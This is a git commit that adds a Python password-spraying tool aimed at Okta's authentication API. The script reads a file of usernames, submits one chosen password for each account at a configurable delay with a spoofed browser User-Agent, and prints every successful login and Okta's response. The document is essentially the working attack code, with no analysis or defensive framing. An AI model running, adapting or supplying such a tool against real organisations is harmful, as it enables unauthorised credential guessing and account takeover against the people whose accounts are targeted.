3e20681c7f7b922a2f18c0c1cfa9e5b2d825c97b
cedowens <41086586+cedowens@users.noreply.github.com>
2020-07-24 11:41:57 -0500

    Add files via upload

---
+++ okta-sprayer2.py
@@ -0,0 +1,52 @@
+import requests
+from requests.auth import HTTPBasicAuth
+from optparse import OptionParser
+import sys
+import time
+
+if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
+    print("Usage:")
+    print("python3 %s -p <password> -f <inputfile> -d <domain> -w <wait_time>" % sys.argv[0])
+    sys.exit(1)
+
+
+parser = OptionParser()
+parser.add_option("-p", "--password", help="Password to spray with")
+parser.add_option("-f", "--inputfile", help="File with usernames")
+parser.add_option("-d", "--domain", help="Company domain")
+parser.add_option("-w", "--wait", help="Seconds to wait between each spray attempt")
+(options, args) = parser.parse_args()
+
+domain = options.domain.partition('.')
+domain2 = domain[0]
+sleeptime = int(options.wait)
+
+oktadomain = '%s.okta.com' % domain2
+
+url = 'https://%s/api/v1/authn' % oktadomain
+headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
+
+print("+"*100)
+print("Okta Password Sprayer")
+print("+"*100)
+password = options.password.strip()
+print("Spraying...")
+with open ("%s" % options.inputfile, "r") as oktausers:
+    for line in oktausers:
+        try:
+            usr = line.strip()
+            data = {"username":"{}".format(usr),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}
+            time.sleep(sleeptime)
+            response = requests.post(url, headers=headers, json=data)
+            if response.status_code == 200:
+                print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
+                print("\033[1mOkta Response Info:\033[0m")
+                print(response.text)
+                response.close()
+            else:
+                print("\033[91mAuthentication failed - %s:%s\033[0m" % (usr, password))
+        except Exception as e:
+            print(e)
+
+
+
